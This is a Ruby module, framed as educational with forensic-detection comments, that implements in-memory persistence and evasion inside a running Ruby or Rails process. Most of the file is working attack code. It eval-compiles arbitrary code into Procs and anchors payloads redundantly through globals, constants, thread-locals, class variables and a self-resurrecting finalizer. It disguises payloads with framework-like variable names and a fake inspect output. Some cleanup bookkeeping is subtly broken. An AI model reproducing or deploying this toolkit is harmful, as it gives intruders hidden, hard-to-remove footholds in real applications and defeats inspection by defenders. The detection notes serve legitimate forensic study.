# frozen_string_literal: false
#
# RubyGuardian Phase 1d - ObjectSpace Persistence Evasion
# Module: ObjectSpace Injector
#
# EDUCATIONAL PURPOSE ONLY - Demonstrates how an attacker can inject arbitrary
# objects into a running Ruby process's ObjectSpace. Understanding this technique
# is critical for building detection and forensic analysis tools.
#
# FORENSIC DETECTION:
# - Compare ObjectSpace.count_objects before/after suspected injection
# - Use ObjectSpace.trace_object_allocations to track allocation sources
# - Objects injected via eval will show "(eval)" as source_location
# - Monitor for unexpected increases in T_OBJECT, T_CLASS, T_DATA counts

require 'objspace'

module RubyGuardian
  module ObjectSpacePersistence
    class ObjectSpaceInjector
      # Tracks all injected objects for educational auditing
      attr_reader :injected_objects, :injection_log

      def initialize(options = {})
        @injected_objects = []
        @injection_log = []
        @verbose = options.fetch(:verbose, false)
        @tag = options.fetch(:tag, "rg_injected")

        # Capture baseline object counts for comparison
        @baseline_counts = ObjectSpace.count_objects.dup

        log("ObjectSpaceInjector initialized")
        log("Baseline object counts captured: #{@baseline_counts.inspect}")
      end

      # Inject a raw object into ObjectSpace by anchoring it to prevent GC.
      #
      # EDUCATIONAL: The key insight is that simply creating an object is not
      # enough - it must be referenced from a GC root to survive collection.
      # This method creates the object and anchors it via multiple strategies.
      #
      # @param payload [Object] The object/data to persist in memory
      # @param anchor_strategy [Symbol] How to prevent GC collection
      # @return [Integer] The object_id of the injected object
      def inject(payload, anchor_strategy: :instance_var, anchor_target: nil)
        log("Injecting payload (#{payload.class}, #{payload.inspect[0..50]})")
        log("  Strategy: #{anchor_strategy}")

        wrapper = create_wrapper(payload)

        case anchor_strategy
        when :instance_var
          anchor_via_instance_variable(wrapper, anchor_target)
        when :global
          anchor_via_global(wrapper)
        when :constant
          anchor_via_constant(wrapper)
        when :thread_local
          anchor_via_thread_local(wrapper)
        when :class_var
          anchor_via_class_variable(wrapper, anchor_target)
        when :finalizer
          anchor_via_finalizer(wrapper)
        when :array_append
          anchor_via_array_append(wrapper, anchor_target)
        else
          raise ArgumentError, "Unknown anchor strategy: #{anchor_strategy}"
        end

        @injected_objects << wrapper
        @injection_log << {
          timestamp: Time.now,
          object_id: wrapper.object_id,
          strategy: anchor_strategy,
          payload_class: payload.class.name,
          anchor_target: anchor_target&.class&.name
        }

        log("  Injected successfully, object_id: #{wrapper.object_id}")
        wrapper.object_id
      end

      # Inject executable code that will be triggered when called.
      #
      # EDUCATIONAL: Proc objects in Ruby are closures - they capture their
      # surrounding binding. An injected Proc can access variables from the
      # injection context, which may include sensitive data.
      #
      # FORENSIC DETECTION: Scan for Proc objects with unexpected source_location.
      # Legitimate Procs will have source files within the application directory.
      #
      # @param code_string [String] Ruby code to compile into a Proc
      # @param anchor_strategy [Symbol] How to prevent GC
      # @return [Hash] Injection result with object_id and trigger method
      def inject_executable(code_string, anchor_strategy: :instance_var, anchor_target: nil)
        log("Injecting executable payload")

        # EDUCATIONAL: eval compiles Ruby code at runtime. The resulting Proc
        # will show "(eval)" as its source_location - this is a key detection signal.
        executable = eval("proc { #{code_string} }")

        log("  Compiled Proc, source_location: #{executable.source_location.inspect}")

        object_id = inject(executable, anchor_strategy: anchor_strategy, anchor_target: anchor_target)

        {
          object_id: object_id,
          source_location: executable.source_location,
          trigger: executable
        }
      end

      # Inject into a specific target object's instance variable namespace.
      #
      # EDUCATIONAL: Every Ruby object can have arbitrary instance variables
      # added at runtime. By choosing variable names that mimic framework
      # internals (e.g., @_cache, @__mutex), the injection blends in.
      #
      # FORENSIC DETECTION: Compare an object's instance_variables against
      # the expected set from its class definition source code.
      #
      # @param target [Object] The object to attach the payload to
      # @param payload [Object] The data/code to persist
      # @param var_name [String] Instance variable name (should start with @)
      # @return [Integer] object_id of injected payload
      def inject_into_target(target, payload, var_name: nil)
        var_name ||= generate_innocent_ivar_name
        log("Injecting into #{target.class}##{var_name}")

        # Ensure the variable name starts with @
        var_name = "@#{var_name}" unless var_name.start_with?("@")

        target.instance_variable_set(var_name.to_sym, payload)

        @injected_objects << payload
        @injection_log << {
          timestamp: Time.now,
          object_id: payload.object_id,
          strategy: :direct_ivar,
          target_class: target.class.name,
          target_id: target.object_id,
          var_name: var_name
        }

        log("  Attached to #{target.class}##{var_name}")
        payload.object_id
      end

      # Bulk inject multiple payloads using different strategies for resilience.
      #
      # EDUCATIONAL: A sophisticated attacker would use multiple anchoring
      # strategies so that even if one is discovered and removed, others persist.
      #
      # @param payload [Object] The payload to persist
      # @param strategies [Array<Symbol>] List of anchor strategies to use
      # @return [Array<Integer>] object_ids of all injected copies
      def inject_redundant(payload, strategies: [:instance_var, :global, :constant, :thread_local])
        log("Redundant injection with #{strategies.length} strategies")

        strategies.map do |strategy|
          inject(payload.dup, anchor_strategy: strategy)
        end
      end

      # Report on the current state of injected objects.
      # Verifies which injections are still alive (not GC'd).
      #
      # @return [Hash] Status report
      def status_report
        alive_count = 0
        dead_count = 0

        @injected_objects.each do |obj|
          begin
            ObjectSpace._id2ref(obj.object_id)
            alive_count += 1
          rescue RangeError
            dead_count += 1
          end
        end

        current_counts = ObjectSpace.count_objects
        delta = {}
        @baseline_counts.each do |type, count|
          diff = (current_counts[type] || 0) - count
          delta[type] = diff if diff != 0
        end

        {
          total_injected: @injected_objects.length,
          alive: alive_count,
          collected: dead_count,
          object_count_delta: delta,
          log_entries: @injection_log.length
        }
      end

      # Clean up all injected objects (for controlled testing).
      #
      # @return [Integer] Number of objects cleaned
      def cleanup!
        cleaned = 0
        @injection_log.each do |entry|
          case entry[:strategy]
          when :global
            var_name = entry[:global_name]
            eval("#{var_name} = nil") if var_name
            cleaned += 1
          when :thread_local
            key = entry[:thread_key]
            Thread.current[key] = nil if key
            cleaned += 1
          end
        end

        @injected_objects.clear
        @injection_log.clear

        # Force GC to collect unanchored objects
        GC.start(full_mark: true, immediate_sweep: true)
        cleaned
      end

      private

      # Create a wrapper object that holds the payload and metadata.
      # The wrapper mimics a legitimate internal framework object.
      def create_wrapper(payload)
        wrapper = Object.new

        # Store payload as an instance variable with an innocent name
        wrapper.instance_variable_set(:@_internal_cache_data, payload)
        wrapper.instance_variable_set(:@_cache_version, Time.now.to_i)
        wrapper.instance_variable_set(:@_rg_tag, @tag)

        # Define a method to retrieve the payload
        wrapper.define_singleton_method(:__payload) { @_internal_cache_data }

        # EDUCATIONAL: We override inspect to make the object look benign
        # when examined casually. A forensic analyst should use ObjectSpace.dump
        # instead of inspect for reliable information.
        wrapper.define_singleton_method(:inspect) do
          "#<InternalCacheEntry:0x#{object_id.to_s(16)}>"
        end

        wrapper
      end

      # Anchor via instance variable on a long-lived object
      def anchor_via_instance_variable(wrapper, target)
        # If no target specified, find a suitable long-lived object
        target ||= find_long_lived_object
        var_name = generate_innocent_ivar_name

        target.instance_variable_set(var_name.to_sym, wrapper)
        log("  Anchored via #{target.class}##{var_name}")
      end

      # Anchor via a global variable with an innocent-looking name
      def anchor_via_global(wrapper)
        # EDUCATIONAL: Global variables starting with $ are GC roots.
        # Names that mimic Ruby internals are less likely to be noticed.
        global_name = "$__ruby_internal_cache_#{SecureRandom.hex(4)}"
        eval("#{global_name} = wrapper")

        @injection_log.last&.[]=(:global_name, global_name) if @injection_log.last
        log("  Anchored via global #{global_name}")
      end

      # Anchor via a constant in an existing module
      def anchor_via_constant(wrapper)
        # EDUCATIONAL: Constants are GC roots. Hiding a constant inside
        # an existing stdlib module makes it less conspicuous.
        const_name = "INTERNAL_CACHE_#{SecureRandom.hex(4).upcase}"
        Object.const_set(const_name, wrapper)
        log("  Anchored via constant ::#{const_name}")
      end

      # Anchor via thread-local variable
      def anchor_via_thread_local(wrapper)
        key = :"__rack_utils_cache_#{SecureRandom.hex(4)}"
        Thread.current[key] = wrapper

        @injection_log.last&.[]=(:thread_key, key) if @injection_log.last
        log("  Anchored via Thread.current[#{key}]")
      end

      # Anchor via class variable on an existing class
      def anchor_via_class_variable(wrapper, target_class)
        target_class ||= Object
        var_name = "@@__internal_#{SecureRandom.hex(4)}"
        target_class.class_variable_set(var_name.to_sym, wrapper)
        log("  Anchored via #{target_class.name}.#{var_name}")
      end

      # Anchor via finalizer (self-resurrecting pattern)
      def anchor_via_finalizer(wrapper)
        # EDUCATIONAL: The finalizer creates a circular persistence mechanism.
        # When the original object is collected, the finalizer re-creates it.
        # This is detectable by monitoring finalizer registrations.
        poison = proc do |_id|
          new_wrapper = wrapper.dup rescue Object.new
          ObjectSpace.define_finalizer(new_wrapper, poison)
          Thread.current[:__finalizer_cache] = new_wrapper
        end
        ObjectSpace.define_finalizer(wrapper, poison)
        # Also keep a direct reference
        Thread.current[:__finalizer_anchor] = wrapper
        log("  Anchored via self-resurrecting finalizer")
      end

      # Anchor by appending to an existing array (e.g., $LOAD_PATH)
      def anchor_via_array_append(wrapper, target_array)
        target_array ||= ($LOADED_FEATURES rescue [])
        # EDUCATIONAL: We can't directly append a non-String to $LOAD_PATH,
        # but we can attach to the array object itself via instance variables
        target_array.instance_variable_set(:@__meta_cache, wrapper)
        log("  Anchored via array instance variable on #{target_array.class}")
      end

      # Find a suitable long-lived object to attach to
      def find_long_lived_object
        # Prefer Rails objects if available, otherwise use core Ruby objects
        if defined?(Rails) && Rails.respond_to?(:application) && Rails.application
          Rails.application
        elsif defined?(Rack::Utils)
          Rack::Utils
        else
          # Fall back to the Object class itself
          Object
        end
      end

      # Generate an instance variable name that looks like framework internals
      def generate_innocent_ivar_name
        prefixes = %w[
          _cache _mutex _monitor _config _internal
          _connection _pool _registry _store _handler
        ]
        suffixes = %w[data ref entry table map store lock version]
        "@__#{prefixes.sample}_#{suffixes.sample}_#{rand(100)}"
      end

      def log(message)
        return unless @verbose
        timestamp = Time.now.strftime("%H:%M:%S.%L")
        $stderr.puts "[RubyGuardian #{timestamp}] #{message}"
      end
    end
  end
end
